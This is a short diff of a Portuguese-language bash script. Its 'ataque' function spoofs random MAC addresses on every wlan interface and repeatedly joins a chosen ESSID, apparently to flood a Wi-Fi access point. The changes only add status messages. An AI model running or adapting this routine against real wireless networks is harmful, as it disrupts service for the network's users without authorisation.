@@ -9,6 +9,7 @@ ataque(){
 		ifconfig $1 hw ether 00:16:3e:$primeiro:$segundo:$terceiro;
 		ifconfig $1 up;
 		sleep 1
+		echo "Ataque operando pelo MAC : " 00:16:3e:$primeiro:$segundo:$terceiro " sendo desenvolvido."
 		iwconfig $1 essid $2 ;
 	done
 }
@@ -20,7 +21,8 @@ read essid
 cd /proc/net/dev_snmp6/
 for i in $(ls wlan* )
 do
-	ataque $i $essid &	
+	ataque $i $essid &
+	echo "interface" $i "configurada para ataque e inicializada"	
 done
 
 cd -
